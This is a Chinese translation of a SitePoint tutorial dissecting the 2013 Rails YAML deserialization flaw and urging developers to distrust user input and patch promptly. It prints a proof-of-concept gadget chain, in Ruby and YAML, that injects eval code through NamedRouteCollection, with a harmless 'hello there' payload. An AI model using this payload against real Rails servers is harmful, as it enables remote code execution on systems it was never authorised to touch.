# 剖析漏洞:深入了解 Rails YAML 漏洞

> 原文：<https://www.sitepoint.com/anatomy-of-an-exploit-an-in-depth-look-at-the-rails-yaml-vulnerability/>

漏洞利用时有发生，这个月 Rails 和 Ruby 社区也不缺漏洞。从 Rails 中的一个重大漏洞到略有不同的 Rubygems.org 攻击，现在是重温软件安全性的最佳时机。

也许您想知道为什么这些漏洞首先会发生，为什么它们没有在第一时间被发现，或者也许您只是想知道这次攻击的具体情况。我们将从剖析安全漏洞开始，然后深入 YAML 问题的血淋淋的细节。

## 为什么会出现不安全的代码

没有人打算编写不安全的软件。这些漏洞是软件中的缺陷，可以被其他人利用。与导致软件无法正常运行的普通错误不同，打开安全漏洞的错误可能仍然可以很好地完成您的任务，并且实际上不会抛出任何错误。这通常是由于代码中的副作用造成的。让我们来看一些代码示例:

## 意外输入

假设你因为某种原因需要将一个数翻倍，那么你写一个这样的函数:

```
def double(number)
  return number * 2
end 
```

您测试了它，它运行良好:

```
double(10)
# => 20 
```

虽然这不是一个不安全的函数，但它可能会以您不希望的方式使用。看看当我们将一个字符串传递给函数时会发生什么:

```
double("foo")
# => "foofoo" 
```

这不是我们想要的，也不是准则的初衷。不管怎样，这是我们实现的副作用，如果你传入一个字符串，那么`*`操作符将被调用，它复制了这个字符串。

这实际上并没有打开任何安全漏洞，但它只是向您展示了旨在做一件事的软件有时会有意想不到的能力。

## 真实的例子

我们将研究使 YAML 攻击发生在 Rails 系统上的所有因素。你应该知道，所有这些信息都是公开的，并且在“坏人”的手中。希望这些信息能帮助你编写更好的代码，并在将来做出更好的决定。

如果你在一个框架或平台中发现了一个安全漏洞，做负责任的事情并在公开信息之前向所有者报告。

要了解这次攻击，您需要了解 YAML，让我们快速回顾一下。

## YAML 进修

YAML ( [YAML 不是标记语言](http://en.wikipedia.org/wiki/YAML))经常被 ruby 爱好者用来存储配置文件。最著名的 yml 文件可能是 Rails 中使用的`config/database.yml`,它看起来像这样:

```
development:
  adapter: postgresql
  encoding: utf8
  database: example_development
  pool: 5
  host: localhost 
```

并且可以使用`YAML::load_file`读入

```
require 'yaml'
database_config = YAML::load_file('database.yml')

puts database_config["development"]
# => {"adapter"=>"postgresql", "encoding"=>"utf8", "database"=>"example_development", "pool"=>5, "host"=>"localhost"} 
```

YAML 不仅仅用于文件，它是一种类似 JSON 的序列化格式。我们可以用它来传递复杂的对象，比如字符串、数字和数组。甚至支持传递任意用户定义的对象，如`User`或`Product`。这就是我们遇到麻烦的地方。

## YAML 的红宝石物品

YAML 允许我们直接表示 ruby 对象，理解它如何工作的最好方法是看它的实际操作。让我们看看如何构建一个简单的数组。你可以把它放在一个`.yml`文件的顶部，然后读入:

```
--- !ruby/array:Array
  - jacket
  - sweater 
```

当您解析它时，它应该产生`["jacket", "sweater"]`。但是我们不局限于简单的 Ruby 对象，比如数组和字符串，我们可以构建项目中的任何类，比如`User`,如果我们想:

```
--- !ruby/hash:User
email: richard@example.com 
```

现在，当我们加载这个 YAML 格式的字符串时:

```
string = "--- !ruby/hash:Usern" +
"email: richard@example.com"

YAML::load(string)
 => #<User id: 1, email: "richard@example.com"> 
```

我们得到一个用户对象。从本质上讲，Ruby 所做的就是将左边的所有属性(比如“email ”)作为右边的值应用到一个新对象上，就好像它是一个散列一样。像这样:

```
user = User.new
user["email"] = "richard@example.com" 
```

这是 YAML 的创建者所期望的功能，因为它给了开发人员向磁盘读写 Ruby 对象的能力，就像对象数据库一样。不幸的是，这是 YAML 经常被忽视的能力。此外，这种能力有一个意想不到的副作用，就像将一个字符串传递给我们的`double()`方法一样。

## 脆弱的物体

您可能会想，既然我们只创建必须在服务器上定义的对象，那么这种对象实例化能力不会太差。不幸的是，让我们看看攻击者是如何使用这些函数来执行任意代码的。

为了利用这一漏洞，我们需要在代码中包含一个类，该类在创建时评估代码:

```
user = User.new 
```

或者当我们设定价值时

```
user["email"] = "richard@example.com" 
```

因为“email”和“richard@example.com”都是我们可以通过 YAML 操作的值，所以这是查看的最佳位置。

在这种情况下，一个易受攻击的类`ActionDispatch::Routing::RouteSet::NamedRouteCollection`被发现可通过[@连](https://github.com/lian)利用，并通过 [Rapid7](https://community.rapid7.com/community/metasploit/blog/2013/01/09/serialization-mischief-in-ruby-land-cve-2013-0156?x=1) 公布。为了理解这个类是如何被利用的，让我们尝试直接在这个类上运行任意代码。

首先，我们实例化该类:

```
unsafe_object = ActionDispatch::Routing::RouteSet::NamedRouteCollection.new 
```

然后设定一个值:

```
struct        = OpenStruct.new(defaults: {}) 
```

现在，我们创建一个漏洞利用有效负载`foo; eval(puts '=== hello there'.inspect);`，并将有效负载的属性设置为如下值:

```
unsafe_object["foo; eval(puts '=== hello there'.inspect);" ] = struct 
```

现在，当您运行这段代码时，您会得到一个错误，但是在这个错误之前，您放入那个`eval()`中的任何代码都将被执行:

```
# => "=== hello there" 
```

这种行为本质上并不安全，毕竟我们不得不手动构建漏洞字符串并手动实例化我们的类。只有当我们把所有这些东西放在一起时，问题才会出现。

## 利用

我们知道我们有一个运行任意代码的类:

```
unsafe_object = ActionDispatch::Routing::RouteSet::NamedRouteCollection.new
struct        = OpenStruct.new(defaults: {})
unsafe_object["foo; eval(puts '=== hello there'.inspect);"] = struct
# => "=== hello there" 
```

我们知道我们可以用 YAML 制造这样的物体:

```
--- !ruby/hash:ActionDispatch::Routing::RouteSet::NamedRouteCollection
 'foo; eval(eval(puts '=== hello there'.inspect);': !ruby/object:OpenStruct
   table:
    :defaults: {} 
```

即使有这两个元素，我们的 Rails 应用程序仍然是安全的，除非允许用户向应用程序发送加载的任意 YAML。正如您可能已经猜到的，有一个错误允许恶意用户使用 XML 请求将 YAML 注入到 Rails 应用程序中。当您将这三个要素放在一起时，您就拥有了一个可以被恶意用户完全接管的系统。如果有人可以在你的服务器上运行任意代码，你就不再拥有那个服务器，而是他们。

## 后部 20/20

针对不同易受攻击版本的 Rails XML 和 JSON 解析器中的漏洞已经得到修复，有些人问为什么没有早点检测到并修补这些漏洞。简单的回答是:安全很难。这些问题只有在回顾时才显而易见。Rails 和 Ruby 的安全性丝毫不亚于其他框架和语言。安全漏洞本质上是缺陷，很难检测。几乎可以肯定，你的笔记本电脑/手机/服务器/车库门开启器的某个地方都有不安全的软件——只是还没有被发现而已。

希望您已经体会到发现这些漏洞有多困难。我们可以用知识和对用户提交信息的健康的不信任来武装自己。

## 知识就是力量

越多人了解如何利用 YAML 攻击系统，就越容易在系统投入生产之前发现安全漏洞。当发现漏洞时，该软件的开发人员了解根本原因并帮助将知识传播给他人是非常重要的。我不是安全研究员或专家，只是一个已经写了几年 Rails 代码的人。直到我开始研究这次袭击，我不知道为什么，但现在我永远不会忘记。

## 永远不要相信你的用户

教训不是 YAML 是邪恶的，它仍然像以前一样令人敬畏。教训是你永远不要相信用户的输入。如果攻击者无法接触您的代码或以意想不到的方式使用它，他们就无法利用它。这在实践中很难做到，但一点点额外的关注可以走很长的路。

## 保持最新状态

订阅为您使用的主要软件发布安全公告的邮件列表或群组，例如 [Rails 安全组](https://groups.google.com/forum/?fromgroups#!forum/rubyonrails-security)。当一个公告出来，立即升级，即使威胁很小。希望你已经看到了一个软件的意外使用是如何导致另一个的。我工作的公司 Heroku 认为这个问题的威胁非常严重，所以我们通知了运行易受攻击代码的人。

即使拥有世界上所有的知识，如果您继续运行具有已知漏洞的软件，也没有任何好处。

## 概述

您可能不是安全研究人员，但希望您不仅对这次 YAML 攻击有所了解，而且对安全漏洞的本质也有所了解。你已经学会不信任用户的输入，你已经知道知识就是力量。所以去分享你的知识吧，把这篇文章发给另一个开发者，他们可能会喜欢。

## 分享这篇文章